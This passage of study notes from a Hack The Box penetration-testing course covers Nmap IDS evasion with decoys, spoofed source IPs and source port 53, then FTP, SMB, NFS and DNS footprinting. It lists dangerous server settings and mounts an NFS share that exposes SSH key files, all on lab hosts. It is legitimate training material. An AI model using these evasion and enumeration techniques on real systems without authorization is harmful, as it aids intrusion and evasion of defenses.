style=text-align:left>version</td><td style=text-align:left>Extension for service detection.</td></tr><tr><td style=text-align:left>vuln</td><td style=text-align:left>Identification of specific vulnerabilities.</td></tr></tbody></table><h3 id=decoys>Decoys<a hidden class=anchor aria-hidden=true href=#decoys>#</a></h3><p>There are cases in which administrators block specific subnets from different regions in principle. This prevents any access to the target network. Another example is when IPS should block us. For this reason, the Decoy scanning method (-D) is the right choice. With this method, Nmap generates various random IP addresses inserted into the IP header to disguise the origin of the packet sent. With this method, we can generate random (RND) a specific number (for example: 5) of IP addresses separated by a colon (:). Our real IP address is then randomly placed between the generated IP addresses. In the next example, our real IP address is therefore placed in the second position. Another critical point is that the decoys must be alive. Otherwise, the service on the target may be unreachable due to SYN-flooding security mechanisms.</p><p><strong>Random Source IPs</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ sudo nmap 10.129.2.28 -p <span class=m>80</span> -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Starting Nmap 7.80 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2020-06-21 16:14 CEST
</span></span><span class=line><span class=cl>SENT <span class=o>(</span>0.0378s<span class=o>)</span> TCP 102.52.161.59:59289 &gt; 10.129.2.28:80 S <span class=nv>ttl</span><span class=o>=</span><span class=m>42</span> <span class=nv>id</span><span class=o>=</span><span class=m>29822</span> <span class=nv>iplen</span><span class=o>=</span><span class=m>44</span>  <span class=nv>seq</span><span class=o>=</span><span class=m>3687542010</span> <span class=nv>win</span><span class=o>=</span><span class=m>1024</span> &lt;mss 1460&gt;
</span></span><span class=line><span class=cl>SENT <span class=o>(</span>0.0378s<span class=o>)</span> TCP 10.10.14.2:59289 &gt; 10.129.2.28:80 S <span class=nv>ttl</span><span class=o>=</span><span class=m>59</span> <span class=nv>id</span><span class=o>=</span><span class=m>29822</span> <span class=nv>iplen</span><span class=o>=</span><span class=m>44</span>  <span class=nv>seq</span><span class=o>=</span><span class=m>3687542010</span> <span class=nv>win</span><span class=o>=</span><span class=m>1024</span> &lt;mss 1460&gt;
</span></span><span class=line><span class=cl>SENT <span class=o>(</span>0.0379s<span class=o>)</span> TCP 210.120.38.29:59289 &gt; 10.129.2.28:80 S <span class=nv>ttl</span><span class=o>=</span><span class=m>37</span> <span class=nv>id</span><span class=o>=</span><span class=m>29822</span> <span class=nv>iplen</span><span class=o>=</span><span class=m>44</span>  <span class=nv>seq</span><span class=o>=</span><span class=m>3687542010</span> <span class=nv>win</span><span class=o>=</span><span class=m>1024</span> &lt;mss 1460&gt;
</span></span><span class=line><span class=cl>SENT <span class=o>(</span>0.0379s<span class=o>)</span> TCP 191.6.64.171:59289 &gt; 10.129.2.28:80 S <span class=nv>ttl</span><span class=o>=</span><span class=m>38</span> <span class=nv>id</span><span class=o>=</span><span class=m>29822</span> <span class=nv>iplen</span><span class=o>=</span><span class=m>44</span>  <span class=nv>seq</span><span class=o>=</span><span class=m>3687542010</span> <span class=nv>win</span><span class=o>=</span><span class=m>1024</span> &lt;mss 1460&gt;
</span></span><span class=line><span class=cl>SENT <span class=o>(</span>0.0379s<span class=o>)</span> TCP 184.178.194.209:59289 &gt; 10.129.2.28:80 S <span class=nv>ttl</span><span class=o>=</span><span class=m>39</span> <span class=nv>id</span><span class=o>=</span><span class=m>29822</span> <span class=nv>iplen</span><span class=o>=</span><span class=m>44</span>  <span class=nv>seq</span><span class=o>=</span><span class=m>3687542010</span> <span class=nv>win</span><span class=o>=</span><span class=m>1024</span> &lt;mss 1460&gt;
</span></span><span class=line><span class=cl>SENT <span class=o>(</span>0.0379s<span class=o>)</span> TCP 43.21.121.33:59289 &gt; 10.129.2.28:80 S <span class=nv>ttl</span><span class=o>=</span><span class=m>55</span> <span class=nv>id</span><span class=o>=</span><span class=m>29822</span> <span class=nv>iplen</span><span class=o>=</span><span class=m>44</span>  <span class=nv>seq</span><span class=o>=</span><span class=m>3687542010</span> <span class=nv>win</span><span class=o>=</span><span class=m>1024</span> &lt;mss 1460&gt;
</span></span><span class=line><span class=cl>RCVD <span class=o>(</span>0.1370s<span class=o>)</span> TCP 10.129.2.28:80 &gt; 10.10.14.2:59289 SA <span class=nv>ttl</span><span class=o>=</span><span class=m>64</span> <span class=nv>id</span><span class=o>=</span><span class=m>0</span> <span class=nv>iplen</span><span class=o>=</span><span class=m>44</span>  <span class=nv>seq</span><span class=o>=</span><span class=m>4056111701</span> <span class=nv>win</span><span class=o>=</span><span class=m>64240</span> &lt;mss 1460&gt;
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.2.28
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.099s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT   STATE SERVICE
</span></span><span class=line><span class=cl>80/tcp open  http
</span></span><span class=line><span class=cl>MAC Address: DE:AD:00:00:BE:EF <span class=o>(</span>Intel Corporate<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 0.15 seconds
</span></span></code></pre></div><table><thead><tr><th style=text-align:left>Scanning Options</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>10.129.2.28</code></td><td style=text-align:left>Scans the specified target.</td></tr><tr><td style=text-align:left><code>-p 80</code></td><td style=text-align:left>Scans only the specified ports.</td></tr><tr><td style=text-align:left><code>-sS</code></td><td style=text-align:left>Performs SYN scan on specified ports.</td></tr><tr><td style=text-align:left><code>-Pn</code></td><td style=text-align:left>Disables ICMP Echo requests.</td></tr><tr><td style=text-align:left><code>-n</code></td><td style=text-align:left>Disables DNS resolution.</td></tr><tr><td style=text-align:left><code>--disable-arp-ping</code></td><td style=text-align:left>Disables ARP ping.</td></tr><tr><td style=text-align:left><code>--packet-trace</code></td><td style=text-align:left>Shows all packets sent and received.</td></tr><tr><td style=text-align:left><code>-D RND:5</code></td><td style=text-align:left>Generates five random IP addresses that indicates the source IP the connection comes from.</td></tr></tbody></table><p><strong>Specified Source IP</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ sudo nmap 10.129.2.28 -n -Pn -p <span class=m>445</span> -O -S 10.129.2.200 -e tun0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Starting Nmap 7.80 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2020-06-22 01:16 CEST
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.2.28
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.010s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT    STATE SERVICE
</span></span><span class=line><span class=cl>445/tcp open  microsoft-ds
</span></span><span class=line><span class=cl>MAC Address: DE:AD:00:00:BE:EF <span class=o>(</span>Intel Corporate<span class=o>)</span>
</span></span><span class=line><span class=cl>Warning: OSScan results may be unreliable because we could not find at least <span class=m>1</span> open and <span class=m>1</span> closed port
</span></span><span class=line><span class=cl>Aggressive OS guesses: Linux 2.6.32 <span class=o>(</span>96%<span class=o>)</span>, Linux 3.2 - 4.9 <span class=o>(</span>96%<span class=o>)</span>, Linux 2.6.32 - 3.10 <span class=o>(</span>96%<span class=o>)</span>, Linux 3.4 - 3.10 <span class=o>(</span>95%<span class=o>)</span>, Linux 3.1 <span class=o>(</span>95%<span class=o>)</span>, Linux 3.2 <span class=o>(</span>95%<span class=o>)</span>, AXIS 210A or <span class=m>211</span> Network Camera <span class=o>(</span>Linux 2.6.17<span class=o>)</span> <span class=o>(</span>94%<span class=o>)</span>, Synology DiskStation Manager 5.2-5644 <span class=o>(</span>94%<span class=o>)</span>, Linux 2.6.32 - 2.6.35 <span class=o>(</span>94%<span class=o>)</span>, Linux 2.6.32 - 3.5 <span class=o>(</span>94%<span class=o>)</span>
</span></span><span class=line><span class=cl>No exact OS matches <span class=k>for</span> host <span class=o>(</span><span class=nb>test</span> conditions non-ideal<span class=o>)</span>.
</span></span><span class=line><span class=cl>Network Distance: <span class=m>1</span> hop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 4.11 seconds
</span></span></code></pre></div><table><thead><tr><th style=text-align:left>Scanning Options</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>10.129.2.28</code></td><td style=text-align:left>Scans the specified target.</td></tr><tr><td style=text-align:left><code>-n</code></td><td style=text-align:left>Disables DNS resolution.</td></tr><tr><td style=text-align:left><code>-Pn</code></td><td style=text-align:left>Disables ICMP Echo requests.</td></tr><tr><td style=text-align:left><code>-p 445</code></td><td style=text-align:left>Scans only the specified ports.</td></tr><tr><td style=text-align:left><code>-O</code></td><td style=text-align:left>Performs operation system detection scan.</td></tr><tr><td style=text-align:left><code>-S</code></td><td style=text-align:left>Scans the target by using different source IP address.</td></tr><tr><td style=text-align:left><code>10.129.2.200</code></td><td style=text-align:left>Specifies the source IP address.</td></tr><tr><td style=text-align:left><code>-e tun0</code></td><td style=text-align:left>Sends all requests through the specified interface.</td></tr></tbody></table><p><strong>Specified Source Port</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port <span class=m>53</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>SENT <span class=o>(</span>0.0482s<span class=o>)</span> TCP 10.10.14.2:53 &gt; 10.129.2.28:50000 S <span class=nv>ttl</span><span class=o>=</span><span class=m>58</span> <span class=nv>id</span><span class=o>=</span><span class=m>27470</span> <span class=nv>iplen</span><span class=o>=</span><span class=m>44</span>  <span class=nv>seq</span><span class=o>=</span><span class=m>4003923435</span> <span class=nv>win</span><span class=o>=</span><span class=m>1024</span> &lt;mss 1460&gt;
</span></span><span class=line><span class=cl>RCVD <span class=o>(</span>0.0608s<span class=o>)</span> TCP 10.129.2.28:50000 &gt; 10.10.14.2:53 SA <span class=nv>ttl</span><span class=o>=</span><span class=m>64</span> <span class=nv>id</span><span class=o>=</span><span class=m>0</span> <span class=nv>iplen</span><span class=o>=</span><span class=m>44</span>  <span class=nv>seq</span><span class=o>=</span><span class=m>540635485</span> <span class=nv>win</span><span class=o>=</span><span class=m>64240</span> &lt;mss 1460&gt;
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.2.28
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.013s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT      STATE SERVICE
</span></span><span class=line><span class=cl>50000/tcp open  ibm-db2
</span></span><span class=line><span class=cl>MAC Address: DE:AD:00:00:BE:EF <span class=o>(</span>Intel Corporate<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 0.08 seconds
</span></span></code></pre></div><table><thead><tr><th style=text-align:left>Scanning Options</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>10.129.2.28</code></td><td style=text-align:left>Scans the specified target.</td></tr><tr><td style=text-align:left><code>-p 50000</code></td><td style=text-align:left>Scans only the specified ports.</td></tr><tr><td style=text-align:left><code>-sS</code></td><td style=text-align:left>Performs SYN scan on specified ports.</td></tr><tr><td style=text-align:left><code>-Pn</code></td><td style=text-align:left>Disables ICMP Echo requests.</td></tr><tr><td style=text-align:left><code>-n</code></td><td style=text-align:left>Disables DNS resolution.</td></tr><tr><td style=text-align:left><code>--disable-arp-ping</code></td><td style=text-align:left>Disables ARP ping.</td></tr><tr><td style=text-align:left><code>--packet-trace</code></td><td style=text-align:left>Shows all packets sent and received.</td></tr><tr><td style=text-align:left><code>--source-port 53</code></td><td style=text-align:left>Performs the scans from specified source port.</td></tr></tbody></table><h3 id=complete-2>Complete<a hidden class=anchor aria-hidden=true href=#complete-2>#</a></h3><p><a href=https://academy.hackthebox.com/achievement/713396/19 title="Link Of Completion" target=_blank rel="nofollow noopener">Link Of Completion</a></p><p> </p><hr><p> </p><h2 id=footprinting>Footprinting<a hidden class=anchor aria-hidden=true href=#footprinting>#</a></h2><h3 id=enumeration-principles>Enumeration Principles<a hidden class=anchor aria-hidden=true href=#enumeration-principles>#</a></h3><table><thead><tr><th style=text-align:left>No.</th><th style=text-align:left>Principle</th></tr></thead><tbody><tr><td style=text-align:left>1.</td><td style=text-align:left>There is more than meets the eye. Consider all points of view.</td></tr><tr><td style=text-align:left>2.</td><td style=text-align:left>Distinguish between what we see and what we do not see.</td></tr><tr><td style=text-align:left>3.</td><td style=text-align:left>There are always ways to gain more information. Understand the target.</td></tr></tbody></table><p><strong>Enumermation Questions</strong></p><ul><li>What can we see?</li><li>What reasons can we have for seeing it?</li><li>What image does what we see create for us?</li><li>What do we gain from it?</li><li>How can we use it?</li><li>What can we not see?</li><li>What reasons can there be that we do not see?</li><li>What image results for us from what we do not see?</li></ul><h3 id=enumeration-methodology>Enumeration Methodology<a hidden class=anchor aria-hidden=true href=#enumeration-methodology>#</a></h3><p><figure class=image-caption><img alt=methods srcset="/posts/htb/pentester/images/enum-method_hu779285637005451252.webp 480w,
/posts/htb/pentester/images/enum-method_hu12625930382813549573.webp 768w,
/posts/htb/pentester/images/enum-method_hu16517058302127515619.webp 1024w" sizes=100vw src=images/enum-method.png width=768 height=432 loading=lazy><figcaption></figcaption></figure></p><table><thead><tr><th style=text-align:left>Layer</th><th style=text-align:left>Description</th><th style=text-align:left>Information Categories</th></tr></thead><tbody><tr><td style=text-align:left>1. Internet Presence</td><td style=text-align:left>Identification of internet presence and externally accessible infrastructure.</td><td style=text-align:left>Domains, Subdomains, vHosts, ASN, Netblocks, IP Addresses, Cloud Instances, Security Measures</td></tr><tr><td style=text-align:left>2. Gateway</td><td style=text-align:left>Identify the possible security measures to protect the company&rsquo;s external and internal infrastructure.</td><td style=text-align:left>Firewalls, DMZ, IPS/IDS, EDR, Proxies, NAC, Network Segmentation, VPN, Cloudflare</td></tr><tr><td style=text-align:left>3. Accessible Services</td><td style=text-align:left>Identify accessible interfaces and services that are hosted externally or internally.</td><td style=text-align:left>Service Type, Functionality, Configuration, Port, Version, Interface</td></tr><tr><td style=text-align:left>4. Processes</td><td style=text-align:left>Identify the internal processes, sources, and destinations associated with the services.</td><td style=text-align:left>PID, Processed Data, Tasks, Source, Destination</td></tr><tr><td style=text-align:left>5. Privileges</td><td style=text-align:left>Identification of the internal permissions and privileges to the accessible services.</td><td style=text-align:left>Groups, Users, Permissions, Restrictions, Environment</td></tr><tr><td style=text-align:left>6. OS Setup</td><td style=text-align:left>Identification of the internal components and systems setup.</td><td style=text-align:left>OS Type, Patch Level, Network config, OS Environment, Configuration files, sensitive private files</td></tr></tbody></table><h3 id=ftp>FTP<a hidden class=anchor aria-hidden=true href=#ftp>#</a></h3><p>FTP, or File Transfer Protocol, is a standard network protocol used for the transfer of files between a client and server on a computer network. The FTP runs within the application layer of the TCP/IP protocol stack. It&rsquo;s built on a client-server model architecture and uses separate control and data connections between the client and the server.</p><p><strong>Ports</strong></p><ul><li>20 (TCP): Data transfer port (Active Mode).</li><li>21 (TCP): Command/control port (used for connecting to the FTP server).</li></ul><p><strong>vsFTPd</strong></p><table><thead><tr><th style=text-align:left>Setting</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>listen=NO</code></td><td style=text-align:left>Run from inetd or as a standalone daemon?</td></tr><tr><td style=text-align:left><code>listen_ipv6=YES</code></td><td style=text-align:left>Listen on IPv6 ?</td></tr><tr><td style=text-align:left><code>anonymous_enable=NO</code></td><td style=text-align:left>Enable Anonymous access?</td></tr><tr><td style=text-align:left><code>local_enable=YES</code></td><td style=text-align:left>Allow local users to login?</td></tr><tr><td style=text-align:left><code>dirmessage_enable=YES</code></td><td style=text-align:left>Display active directory messages when users go into certain directories?</td></tr><tr><td style=text-align:left><code>use_localtime=YES</code></td><td style=text-align:left>Use local time?</td></tr><tr><td style=text-align:left><code>xferlog_enable=YES</code></td><td style=text-align:left>Activate logging of uploads/downloads?</td></tr><tr><td style=text-align:left><code>connect_from_port_20=YES</code></td><td style=text-align:left>Connect from port 20?</td></tr><tr><td style=text-align:left><code>secure_chroot_dir=/var/run/vsftpd/empty</code></td><td style=text-align:left>Name of an empty directory</td></tr><tr><td style=text-align:left><code>pam_service_name=vsftpd</code></td><td style=text-align:left>This string is the name of the PAM service vsftpd will use.</td></tr><tr><td style=text-align:left><code>rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem</code></td><td style=text-align:left>The last three options specify the location of the RSA certificate to use for SSL encrypted connections.</td></tr><tr><td style=text-align:left><code>rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key</code></td><td style=text-align:left></td></tr><tr><td style=text-align:left><code>ssl_enable=NO</code></td><td style=text-align:left></td></tr></tbody></table><p><strong>Dangerous Settings</strong></p><table><thead><tr><th style=text-align:left>Setting</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>anonymous_enable=YES</code></td><td style=text-align:left>Allowing anonymous login?</td></tr><tr><td style=text-align:left><code>anon_upload_enable=YES</code></td><td style=text-align:left>Allowing anonymous to upload files?</td></tr><tr><td style=text-align:left><code>anon_mkdir_write_enable=YES</code></td><td style=text-align:left>Allowing anonymous to create new directories?</td></tr><tr><td style=text-align:left><code>no_anon_password=YES</code></td><td style=text-align:left>Do not ask anonymous for password?</td></tr><tr><td style=text-align:left><code>anon_root=/home/username/ftp</code></td><td style=text-align:left>Directory for anonymous.</td></tr><tr><td style=text-align:left><code>write_enable=YES</code></td><td style=text-align:left>Allow the usage of FTP commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE?</td></tr></tbody></table><h3 id=smb>SMB<a hidden class=anchor aria-hidden=true href=#smb>#</a></h3><p>SMB, or Server Message Block, is a network file sharing protocol that allows applications on a computer to read and write to files and request services from server programs in a computer network. SMB is used to enable access to files, printers, and other shared resources on a network.</p><p><strong>Ports</strong></p><ul><li>137 (UDP): Used for NetBIOS name service.</li><li>138 (UDP): Used for NetBIOS datagram service.</li><li>139 (TCP/UDP): Used for SMB over NetBIOS (a legacy protocol).</li><li>445 (TCP/UDP): Used for SMB over TCP/IP (CIFS only uses port 445)</li></ul><p><strong>smb.conf</strong></p><table><thead><tr><th style=text-align:left>Setting</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>[sharename]</code></td><td style=text-align:left>The name of the network share.</td></tr><tr><td style=text-align:left><code>workgroup = WORKGROUP/DOMAIN</code></td><td style=text-align:left>Workgroup that will appear when clients query.</td></tr><tr><td style=text-align:left><code>path = /path/here/</code></td><td style=text-align:left>The directory to which user is to be given access.</td></tr><tr><td style=text-align:left><code>server string = STRING</code></td><td style=text-align:left>The string that will show up when a connection is initiated.</td></tr><tr><td style=text-align:left><code>unix password sync = yes</code></td><td style=text-align:left>Synchronize the UNIX password with the SMB password?</td></tr><tr><td style=text-align:left><code>usershare allow guests = yes</code></td><td style=text-align:left>Allow non-authenticated users to access defined share?</td></tr><tr><td style=text-align:left><code>map to guest = bad user</code></td><td style=text-align:left>What to do when a user login request doesn&rsquo;t match a valid UNIX user?</td></tr><tr><td style=text-align:left><code>browseable = yes</code></td><td style=text-align:left>Should this share be shown in the list of available shares?</td></tr><tr><td style=text-align:left><code>guest ok = yes</code></td><td style=text-align:left>Allow connecting to the service without using a password?</td></tr><tr><td style=text-align:left><code>read only = yes</code></td><td style=text-align:left>Allow users to read files only?</td></tr><tr><td style=text-align:left><code>create mask = 0700</code></td><td style=text-align:left>What permissions need to be set for newly created files?</td></tr></tbody></table><p><strong>Dangerous Settings</strong></p><table><thead><tr><th style=text-align:left>Setting</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>browseable = yes</code></td><td style=text-align:left>Allow listing available shares in the current share?</td></tr><tr><td style=text-align:left><code>read only = no</code></td><td style=text-align:left>Forbid the creation and modification of files?</td></tr><tr><td style=text-align:left><code>writable = yes</code></td><td style=text-align:left>Allow users to create and modify files?</td></tr><tr><td style=text-align:left><code>guest ok = yes</code></td><td style=text-align:left>Allow connecting to the service without using a password?</td></tr><tr><td style=text-align:left><code>enable privileges = yes</code></td><td style=text-align:left>Honor privileges assigned to specific SID?</td></tr><tr><td style=text-align:left><code>create mask = 0777</code></td><td style=text-align:left>What permissions must be assigned to the newly created files?</td></tr><tr><td style=text-align:left><code>directory mask = 0777</code></td><td style=text-align:left>What permissions must be assigned to the newly created directories?</td></tr><tr><td style=text-align:left><code>logon script = script.sh</code></td><td style=text-align:left>What script needs to be executed on the user&rsquo;s login?</td></tr><tr><td style=text-align:left><code>magic script = script.sh</code></td><td style=text-align:left>Which script should be executed when the script gets closed?</td></tr><tr><td style=text-align:left><code>magic output = script.out</code></td><td style=text-align:left>Where the output of the magic script needs to be stored?</td></tr></tbody></table><p><strong>SMB Tools</strong></p><ul><li>smbclient</li><li>RPCclient</li><li>Samrdump.py (Impacket)</li><li>SMBmap</li><li>CrackMapExec</li><li>Enum4Linux-ng</li></ul><h3 id=nfs>NFS<a hidden class=anchor aria-hidden=true href=#nfs>#</a></h3><p>Network File System (NFS) is a network file system developed by Sun Microsystems and has the same purpose as SMB. Its purpose is to access file systems over a network as if they were local. However, it uses an entirely different protocol. NFS is used between Linux and Unix systems. This means that NFS clients cannot communicate directly with SMB servers. NFS is an Internet standard that governs the procedures in a distributed file system.</p><table><thead><tr><th style=text-align:left>Version</th><th style=text-align:left>Features</th></tr></thead><tbody><tr><td style=text-align:left>NFSv2</td><td style=text-align:left>It is older but is supported by many systems and was initially operated entirely over UDP.</td></tr><tr><td style=text-align:left>NFSv3</td><td style=text-align:left>It has more features, including variable file size and better error reporting, but is not fully compatible with NFSv2 clients.</td></tr><tr><td style=text-align:left>NFSv4</td><td style=text-align:left>It includes Kerberos, works through firewalls and on the Internet, no longer requires portmappers, supports ACLs, applies state-based operations, and provides performance improvements and high security. It is also the first version to have a stateful protocol.</td></tr></tbody></table><p><strong>Ports</strong></p><ul><li>111 (TCP): RPCbind/Portmapper</li><li>2049 (TCP/UDP): This is the primary port used by NFS servers for client-server communication.</li></ul><p><strong>/etc/exports</strong></p><table><thead><tr><th style=text-align:left>Option</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>rw</code></td><td style=text-align:left>Read and write permissions.</td></tr><tr><td style=text-align:left><code>ro</code></td><td style=text-align:left>Read only permissions.</td></tr><tr><td style=text-align:left><code>sync</code></td><td style=text-align:left>Synchronous data transfer. (A bit slower)</td></tr><tr><td style=text-align:left><code>async</code></td><td style=text-align:left>Asynchronous data transfer. (A bit faster)</td></tr><tr><td style=text-align:left><code>secure</code></td><td style=text-align:left>Ports above 1024 will not be used.</td></tr><tr><td style=text-align:left><code>insecure</code></td><td style=text-align:left>Ports above 1024 will be used.</td></tr><tr><td style=text-align:left><code>no_subtree_check</code></td><td style=text-align:left>This option disables the checking of subdirectory trees.</td></tr><tr><td style=text-align:left><code>root_squash</code></td><td style=text-align:left>Assigns all permissions to files of root UID/GID 0 to the UID/GID of anonymous, which prevents root from accessing files on an NFS mount.</td></tr></tbody></table><p><strong>Dangerous Settings</strong></p><table><thead><tr><th style=text-align:left>Option</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>rw</code></td><td style=text-align:left>Read and write permissions.</td></tr><tr><td style=text-align:left><code>insecure</code></td><td style=text-align:left>Ports above 1024 will be used.</td></tr><tr><td style=text-align:left><code>nohide</code></td><td style=text-align:left>If another file system was mounted below an exported directory, this directory is exported by its own exports entry.</td></tr><tr><td style=text-align:left><code>no_root_squash</code></td><td style=text-align:left>All files created by root are kept with the UID/GID 0.</td></tr></tbody></table><p><strong>Show Mount</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ showmount -e 10.129.14.128
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Export list <span class=k>for</span> 10.129.14.128:
</span></span><span class=line><span class=cl>/mnt/nfs 10.129.14.0/24
</span></span></code></pre></div><p><strong>Mount NFS Share</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ mkdir target-NFS
</span></span><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
</span></span><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ <span class=nb>cd</span> target-NFS
</span></span><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ tree .
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>.
</span></span><span class=line><span class=cl>└── mnt
</span></span><span class=line><span class=cl>    └── nfs
</span></span><span class=line><span class=cl>        ├── id_rsa
</span></span><span class=line><span class=cl>        ├── id_rsa.pub
</span></span><span class=line><span class=cl>        └── nfs.share
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>2</span> directories, <span class=m>3</span> files
</span></span></code></pre></div><p><strong>Unmounting</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ sudo umount ./target-NFS
</span></span></code></pre></div><h3 id=dns>DNS<a hidden class=anchor aria-hidden=true href=#dns>#</a></h3><p>DNS, or Domain Name System, is a hierarchical and decentralized naming system for computers, services, or other resources connected to the Internet or a private network. It translates more readily memorized domain names to the numerical IP addresses needed for locating and identifying computer services and devices with the underlying network protocols.</p><p><strong>Ports</strong></p><ul><li>53 (TCP/UDP): The primary port used by DNS servers.</li></ul><table><thead><tr><th style=text-align:left>Server Type</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left>DNS Root Server</td><td style=text-align:left>The root servers of the DNS are responsible for the top-level domains (TLD). As the last instance, they are only requested if the name server does not respond. Thus, a root server is a central interface between users and content on the Internet, as it links domain and IP address. The Internet Corporation for Assigned Names and Numbers (ICANN) coordinates the work of the root name servers. There are 13 such root servers around the globe.</td></tr><tr><td style=text-align:left>Authoritative Nameserver</td><td style=text-align:left>Authoritative name servers hold authority for a particular zone. They only answer queries from their area of responsibility, and their information is binding. If an authoritative name server cannot answer a client&rsquo;s query, the root name server takes over at that point.</td></tr><tr><td style=text-align:left>Non-authoritative Nameserver</td><td style=text-align:left>Non-authoritative name servers are not responsible for a particular DNS zone. Instead, they collect information on specific DNS zones themselves, which is done using recursive or iterative DNS querying.</td></tr><tr><td style=text-align:left>Caching DNS Server</td><td style=text-align:left>Caching DNS servers cache information from other name servers for a specified period. The authoritative name server determines the duration of this storage.</td></tr><tr><td style=text-align:left>Forwarding Server</td><td style=text-align:left>Forwarding servers perform only one function: they forward DNS queries to another DNS server.</td></tr><tr><td style=text-align:left>Resolver</td><td style=text-align:left>Resolvers are not authoritative DNS servers but perform name resolution locally in the computer or router.</td></tr></tbody></table><p><figure class=image-caption><img alt=dns srcset="/posts/htb/pentester/images/dns_hu1326977227156710661.webp 480w,
/posts/htb/pentester/images/dns_hu3226629986209763955.webp 768w,
/posts/htb/pentester/images/dns_hu2182803163690211937.webp 1024w" sizes=100vw src=images/dns.png width=768 height=466 loading=lazy><figcaption></figcaption></figure></p><table><thead><tr><th style=text-align:left>DNS Record</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left>A</td><td style=text-align:left>Returns an IPv4 address of the requested domain as a result.</td></tr><tr><td style=text-align:left>AAAA</td><td style=text-align:left>Returns an IPv6 address of the requested domain.</td></tr><tr><td style=text-align:left>MX</td><td style=text-align:left>Returns the responsible mail servers as a result.</td></tr><tr><td style=text-align:left>NS</td><td style=text-align:left>Returns the DNS servers (nameservers) of the domain.</td></tr><tr><td style=text-align:left>TXT</td><td style=text-align:left>This record can contain various information. The all-rounder can be used, e.g., to validate the Google Search Console or validate SSL certificates. In addition, SPF and DMARC entries are set to validate mail traffic and protect it from spam.</td></tr><tr><td style=text-align:left>CNAME</td><td style=text-align:left>This record serves as an alias. If the domain &lt;www.hackthebox.eu> should point to the same IP, and we create an A record for one and a CNAME record for the other.</td></tr><tr><td style=text-align:left>PTR</td><td style=text-align:left>The PTR record works the other way around (reverse lookup). It converts IP addresses into valid domain names.</td></tr><tr><td style=text-align:left>SOA</td><td style=text-align:left>Provides information about the corresponding DNS zone and email address of the administrative contact.</td></tr></tbody></table><p><strong>DNS Tools</strong></p><ul><li>dnsenum</li><li>dig</li></ul><h4 id=smtp>SMTP<a hidden class=anchor aria-hidden=true href=#smtp>#</a></h4><p>The Simple Mail Transfer Protocol (SMTP) is a protocol for sending emails in an IP network. It can be used between an email client and an outgoing mail server or between two SMTP servers. SMTP is often combined with the IMAP or POP3 protocols, which can fetch emails and send emails. In principle, it is a client-server-based protocol, 